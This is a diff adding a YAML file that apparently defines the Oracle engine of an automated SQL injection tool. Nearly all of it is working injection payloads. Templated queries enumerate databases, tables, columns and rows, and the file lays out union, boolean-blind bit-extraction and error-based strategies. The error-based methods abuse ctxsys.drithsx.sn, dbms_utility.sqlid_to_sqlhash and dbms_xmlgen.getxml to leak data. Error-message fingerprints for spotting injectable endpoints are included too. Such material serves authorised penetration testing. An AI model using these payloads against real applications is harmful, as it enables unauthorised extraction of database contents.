@@ -1,0 +1,351 @@
+vendor: Oracle
+# 19.3.0/LINUX.X64_193000_db_home.zip
+# buildDockerImage.sh
+# docker run --name oracle19ee \
+# -p 1521:1521 -p 5500:5500 \
+# -e ORACLE_SID=ORCLCDB \
+# -e ORACLE_PDB=ORCLPDB1 \
+# -e ORACLE_PWD=Password1_One \
+# -e ORACLE_CHARACTERSET=AL32UTF8 \
+# oracle/database:19.3.0-ee   
+# jdbc:oracle:thin:@localhost:11521:ORCLCDB
+# system Password1_One
+
+resource:
+ info: |
+  select
+      version
+      || '${enclose_value_sql}'
+      || sys.database_name
+      || '${enclose_value_sql}'
+      || user
+      || '${trail_sql}'
+  from v%24instance
+
+ schema:
+  # TODO Use sys.stragg instead of xmlagg
+  # select sys.stragg (distinct username||chr(32)) from all_users
+  database: |
+   select
+       utl_raw.cast_to_varchar2(
+           cast(
+               dbms_lob.substr(
+                   replace(
+                       replace(
+                           xmlagg(
+                               xmlelement(
+                                   "a",
+                                   rawtohex(
+                                       '${enclose_value_sql}'
+                                       || s
+                                       || '${separator_qte_sql}0${enclose_value_sql}'
+                                   )
+                               ) order by s nulls last
+                           ).getclobval(),
+                           '<a>',''
+                       ),
+                       '<%2fa>',
+                       rawtohex('${separator_cell_sql}')
+                   ) || rawtohex('${trail_sql}'),
+                   4000,
+                   1
+               ) as varchar(1024)
+           )
+       )
+   from (
+       select t.s
+       from
+           (select distinct owner s from all_tables) t,
+           (select distinct owner s from all_tables) t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   )
+
+  table: |
+   select
+       utl_raw.cast_to_varchar2(
+           cast(
+               dbms_lob.substr(
+                   replace(
+                       replace(
+                           xmlagg(
+                               xmlelement(
+                                   "a",
+                                   rawtohex(
+                                       '${enclose_value_sql}'
+                                       || s
+                                       || '${separator_qte_sql}0${enclose_value_sql}'
+                                   )
+                               ) order by s nulls last
+                           ).getclobval(),
+                           '<a>',
+                           ''
+                       ),
+                       '<%2fa>',
+                       rawtohex('${separator_cell_sql}')
+                   ) || rawtohex('${trail_sql}'),
+                   4000,
+                   1
+               ) as varchar(1024)
+           )
+       )
+   from (
+       select t.s
+       from
+           (select distinct table_name s from all_tables where owner = '${database}') t,
+           (select distinct table_name s from all_tables where owner = '${database}') t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   )
+
+  column: |
+   select
+       utl_raw.cast_to_varchar2(
+           cast(
+               dbms_lob.substr(
+                   replace(
+                       replace(
+                           xmlagg(
+                               xmlelement(
+                                   "a",
+                                   rawtohex(
+                                       '${enclose_value_sql}'
+                                       || s
+                                       || '${separator_qte_sql}0${enclose_value_sql}'
+                                   )
+                               ) order by s nulls last
+                           ).getclobval(),
+                           '<a>',
+                           ''
+                       ),
+                       '<%2fa>',
+                       rawtohex('${separator_cell_sql}')
+                   ) || rawtohex('${trail_sql}'),
+                   4000,
+                   1
+               ) as varchar(1024)
+           )
+       )
+   from (
+       select t.s
+       from
+           (select distinct column_name s from all_tab_columns where owner = '${database}' and table_name = '${table}') t,
+           (select distinct column_name s from all_tab_columns where owner = '${database}' and table_name = '${table}') t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   )
+
+  row:
+   query: |
+    select
+        utl_raw.cast_to_varchar2(
+            cast(
+                dbms_lob.substr(
+                    replace(
+                        replace(
+                            xmlagg(
+                                xmlelement(
+                                    "a",
+                                    rawtohex(
+                                        '${enclose_value_sql}'
+                                        || s
+                                        || '${separator_qte_sql}0${enclose_value_sql}'
+                                    )
+                                ) order by s nulls last
+                            ).getclobval(),
+                            '<a>',
+                            ''
+                        ),
+                        '<%2fa>',
+                        rawtohex('${separator_cell_sql}')
+                    ) || rawtohex('${trail_sql}'),
+                    4000,
+                    1
+                ) as varchar(1024)
+            )
+        )
+    from (
+        select t.s
+        from
+            (select distinct ${fields} s from ${database}.${table}) t,
+            (select distinct ${fields} s from ${database}.${table}) t1
+        where t.s >= t1.s
+        group by t.s
+        ${limit}
+    )
+   fields:
+    field: trim(to_char(${field.value}))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           '${lead}'
+           || substr(
+               (${injection}),
+               ${window.char},
+               ${capacity}
+           ) from dual
+   )
+  limit: having count(*) between ${limit.value} and 65536
+  failsafe: to_char(1337${indice}7330%2b1)
+  calibrator: |
+   rpad(
+       '${calibrator_sql}',
+       1024,
+       '${calibrator_sql}'
+   )
+  limitBoundary: 1
+  endingComment: --+-
+  fingerprint:
+    # - Unclosed quotation mark after the character string '
+   errorMessage:
+    # Spring
+    - 'ORA-.*: FROM keyword not found where expected'
+    - 'ORA-.*: SQL command not properly ended'
+    - 'ORA-.*: illegal zero-length identifier'
+    - 'ORA-.*: quoted string not properly terminated'
+    - 'ORA-.*: missing expression (position: \\d+)'
+    - 'ORA-.*: ".*": invalid identifier'
+    - 'ORA-.*: invalid SQL statement'
+    - 'ORA-.*: missing keyword'
+    # Other
+    - function.oci
+    - "Warning: oci_parse()"
+    - "Warning: oci_execute()"
+    - "Warning: oci_fetch_array()"
+   orderByErrorMessage:
+    - ORDER BY item must be the number of a SELECT-list expression
+
+ normal:
+  indices: union select ${indices} from dual
+  capacity: |
+   (
+       select
+           '${lead}'
+           || ${indice}
+           || ${calibrator}
+           s
+       from dual
+   )
+  orderBy: order by 1337
+
+ boolean:
+  test:
+   falses:
+    - 1 = 0
+    - "'a' %21= 'a'"
+    - "'b' %21= 'b'"
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
+   trues:
+    - 0 = 0
+    - "'a' %21= 'b'"
+    - "'a' = 'a'"
+    - 1 = 1
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
+   bit: |
+    0 != bitand(
+        ascii(
+            substr(
+                ${injection},
+                ${window.char},
+                1
+            )
+        ),
+        ${bit}
+    )
+  modeAnd: and
+  modeOr: or
+  blind: ${boolean.mode} ${test}
+  
+ error:
+  method:
+  
+   - name: Drithsx:or
+     query: |
+      /* ORA-20000: Oracle Text error:
+         DRG-11701: thesaurus <sqli> does not exist */
+      or 1=ctxsys.drithsx.sn(1,(
+          ${window}
+      ))
+     capacity: 481
+  
+   - name: Drithsx:and
+     query: |
+      and 1=ctxsys.drithsx.sn(1,(
+          ${window}
+      ))
+     capacity: 481
+  
+   - name: Drithsx:stack
+     query: |
+      ; select ctxsys.drithsx.sn(1,(
+          ${window}
+      )) from dual
+     capacity: 481
+     
+   - name: Sqlhash:or
+     query: |
+      /* ORA-13797: invalid SQL Id specified, <sqli> */
+      or 1=dbms_utility.sqlid_to_sqlhash((
+          ${window}
+      ))
+     capacity: 2004
+  
+   - name: Sqlhash:and
+     query: |
+      and 1=dbms_utility.sqlid_to_sqlhash((
+          ${window}
+      ))
+     capacity: 2004
+     
+   - name: Sqlhash:stack
+     query: |
+      ; select dbms_utility.sqlid_to_sqlhash((
+          ${window}
+      )) from dual
+     capacity: 2004
+     
+   - name: Xml:or
+     query: |
+      /* ORA-19202: Error occurred in XML processing
+         ORA-00904: "<sqli>": invalid identifier */
+      or 1=to_char(
+          dbms_xmlgen.getxml(
+              'select "' || (
+              ${window}
+              ) || '" from sys.dual'
+          )
+      )
+     capacity: 124
+  
+   - name: Xml:and
+     query: |
+      and 1=to_char(
+          dbms_xmlgen.getxml(
+              'select "' || (
+              ${window}
+              ) || '" from sys.dual'
+          )
+      )
+     capacity: 124
+     
+   - name: Xml:stack
+     query: |
+      ; select to_char(
+          dbms_xmlgen.getxml(
+              'select "' || (
+              ${window}
+              ) || '" from sys.dual'
+          )
+      ) from dual
+     capacity: 124
